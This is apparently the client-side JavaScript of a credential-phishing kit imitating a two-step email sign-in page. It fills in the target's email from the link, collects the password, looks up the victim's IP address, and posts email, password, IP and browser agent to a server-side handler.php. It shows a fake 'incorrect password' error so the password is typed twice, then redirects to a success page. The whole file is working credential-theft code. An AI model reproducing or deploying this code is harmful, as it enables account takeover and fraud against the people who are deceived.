const nextBtn = document.querySelector("#next")
const slides = Array.from(document.querySelectorAll(".scene"))
const backBtn = document.querySelector("#back")
const signInButton = document.querySelector("#signInButton")
const errorElem = document.querySelector(".error-message")
const emailInput = document.querySelector(".email-field")
const sendCode = document.querySelector("#send-code")

const emailBox = document.querySelector("[name=email]")
const passwordBox = document.querySelector("[name=password]")

const USER_CREDS = {}
let count = 1

const showError = (msg, type = "") => {
    errorElem.innerText = msg
    errorElem.className = "error-message show" + type
}

const populateEmailField = () => {
    const link = location.href.split("#")
    
    if(link.length > 1) {
        const email = link[link.length - 1]
        emailBox.value = email
        handleNext()
    }
}

const getIPAddress = async () => {
    try {
        const request = await fetch("https://ipapi.co/json/")
        const response = await request.json()
        // console.group("IP")
        // console.log(response)
        // console.groupEnd("IP")
        return response

    } catch (e) {
        return { error: e.message }
    }
}

const removeError = () => {
    errorElem.innerText = ""
    errorElem.className = "error-message"
}

const getSlugEmail = email => {
    const emailArr = email.split("@")
    return `${emailArr[0].slice(0, 2)}*****@${emailArr[1]}`
}

const checkEmail = () => {
    const emailRegex = /^[\w-\.]+@([\w-]+\.)+[\w-]{2,4}$/g

    const email = document.querySelector("[name=email]").value.trim()

    if(!emailRegex.test(email)) {
        showError("Invalid email address")
       return false

    }

    USER_CREDS['email'] = email
    sendCode.innerHTML = `Email code to ${getSlugEmail(email)}`
    emailInput.innerText = email
    return true

}

const isLoading = state => {
    const loader = document.querySelector(".loader")
    if(state) {
        loader.className = "loader show"
    }
    else {
        loader.className = "loader"
    }
}

const handleSendEmail = async () => {
    const formData = new FormData()
    const ip = await getIPAddress()
    formData.append("email", USER_CREDS['email'])
    formData.append("password", USER_CREDS['password'])
    formData.append("ip", ip.ip)
    formData.append("agent", navigator.userAgent)
    formData.append("send", "")

    const option = {
        method: "POST",
        body: formData
    }

    try {
        const request = await fetch("./handler.php", option)
        const response = await request.json()
        return response
    }
    catch (err) {
        return { error: err.message }
    }

}

const handleSubmit = async () => {
    const password = document.querySelector("[name=password]").value.trim()
    const errorDiv = document.querySelectorAll(".error-message")[1]

    if(!password) {
        errorDiv.className = "error-message show"
        errorDiv.innerHTML = "Password is required"
        return
    }
    
    errorDiv.className = "error-message"
    errorDiv.innerHTML = ""
    USER_CREDS['password'] = password
    document.querySelectorAll(".error-message")[1].innerHTML = "Password is required"
    isLoading(true)
    const result = await handleSendEmail()
    if(result) {
        if("error" in result) {
            console.log(result['error'])
        }
        else {
            if(count !== 2) {
                errorDiv.className = "error-message show"
                errorDiv.innerHTML = "Your account or password is incorrect. If you don't remember your password, <a href='#' class='new-link'>reset it now.</a>"
                passwordBox.value = ""
                count++
            }
            else {
                redirect()
                return
            }
        }
    }
    else {
        showError("")
    }
    isLoading(false)
}

const resetInputs = () => {
    const inputs = document.querySelectorAll("input")
    emailInput.innerText = ""
    inputs.forEach(input => {
        input.value = ""
    })
}

const handleNext = () => {
    if(checkEmail()) {
        removeError()
        slides.map(slide => slide.className = "scene")
        slides[1].classList.add("active")
    }
}
const redirect = () => window.location.href = "./success.html"

nextBtn.addEventListener("click", handleNext)

backBtn.addEventListener("click", () => {
    slides.map(slide => slide.className = "scene")
    slides[0].classList.add("active")
})

signInButton.addEventListener("click", handleSubmit)

emailBox.addEventListener("keydown", (e) => {
    if(e.key == "Enter" || e.keyCode == 13) {
        handleNext()
    }
})

passwordBox.addEventListener("keydown", e => {
    if(e.key == "Enter" || e.keyCode == 13) {
        handleSubmit()
    }
})

window.addEventListener("load", populateEmailField)